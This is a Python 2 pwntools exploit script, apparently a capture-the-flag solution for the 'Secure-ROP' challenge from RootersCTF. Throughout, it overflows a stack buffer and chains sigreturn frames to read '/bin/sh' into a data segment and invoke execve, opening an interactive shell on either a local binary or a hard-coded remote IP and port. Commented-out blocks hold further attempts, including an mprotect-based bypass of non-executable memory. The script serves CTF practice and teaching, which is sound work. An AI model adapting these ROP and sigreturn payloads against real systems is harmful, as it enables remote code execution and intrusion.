#!/usr/bin/env python2
'''
    author : tripoloski 
    visit  : https://tripoloski1337.github.io/
    mail   : arsalan.dp@gmail.com
'''
import sys
from pwn import *
context.update(arch="amd64", endian="little", os="linux", log_level="info",)
LOCAL, REMOTE = False, False
TARGET=os.path.realpath("rootersctf/pwn/Secure-ROP/vuln")
elf = ELF(TARGET)

def attach(r):
    if LOCAL:
        bkps = []
        gdb.attach(r, '\n'.join(["break %s"%(x,) for x in bkps]))
    return

def exploit(r):
    #attach(r)
    # infos
    off = 136
    
    # gadget
    pop_rax_syscall = 0x0000000000401032
    pop_rax_syscall_leave_ret = 0x0000000000401032
    ret = 0x0000000000401036
    syscall = 0x000000000040101f
    syscall_leave_ret = 0x0000000000401033
    sub_rsp = 0x0000000000401004
    push_0_pop_rax_syscall = 0x0000000000401030

    # segment
    data = 0x0000000000402000
    writeable = data + 1
    executeable = 0x0000000000402000

    # functions
    sys_read = 0x0000000000401021

    # rop 1
    # p = "\x00" * 128
    # p += p64(90)
    # #p += p64(pop_rax_syscall)
    # #p += p64(writeable)
    # p += p64(sys_read)
    # p += p64(pop_rax_syscall)
    # p += p64(0xf)
    # p += p64(syscall)

    # frame = SigreturnFrame(kernel="amd64")
    # frame.rax = 59
    # frame.rdi = writeable
    # frame.rsi = 0
    # frame.rdx = 0
    # frame.rsp = writeable
    # frame.rip = syscall

    # p += str(frame)
    # p += p64(writeable)

    # defeat NX protection
    # sh = asm(shellcraft.sh())
    # p = sh
    # p = p.ljust(off , "A")
    # p += p64(pop_rax_syscall)
    # p += p64(0xf)

    # # build fake Frame
    # frame = SigreturnFrame(kernel='amd64')
    # frame.rax = 10
    # frame.rdi = executeable
    # frame.rsi = 4096
    # frame.rdx = 7
    # frame.rsp = executeable + len(p) + 248
    # frame.rip = syscall

    # p += str(frame)
    # p += p64(executeable)

    #log.info("payload : " + str(p))

    # r.sendline(p)

    # got it from https://syedfarazabrar.com/2019-10-12-rooters-ctf-pwn-challenges/#secure-rop
    p = "A" * off
    p += p64(pop_rax_syscall)
    p += p64(0xf) # sys_rt_sigreturn

    # sigreturn frame
    frame = SigreturnFrame()
    frame.rax = 0 # read syscall
    frame.rsp = data + 8
    frame.rbp = data + 0x60
    frame.rdi = 0 # read from stdin
    frame.rsi = data # read into the read write segment
    frame.rdx = 0x400 # read 0x400 bytes
    frame.rip = syscall_leave_ret # jmp to the syscall; leave; ret gadget after syscall

    p += str(frame)

    r.sendline(p)

    p = '/bin/sh\x00'
    p += "A" * 96 # Overwrite until return address in our "emulated" stack
    p += p64(pop_rax_syscall)
    p += p64(0xf)

    frame = SigreturnFrame()
    frame.rax = 59
    frame.rdi = data
    frame.rsi = 0
    frame.rdx = 0
    frame.rip = syscall

    p += str(frame)

    r.sendline(p)

    r.interactive()


if __name__ == "__main__":
    if len(sys.argv)==2 and sys.argv[1]=="remote":
        REMOTE = True
        r = remote("146.148.108.204", 4444)
    else:
        LOCAL = True
        r = process([TARGET,])
    exploit(r)
    sys.exit(0)
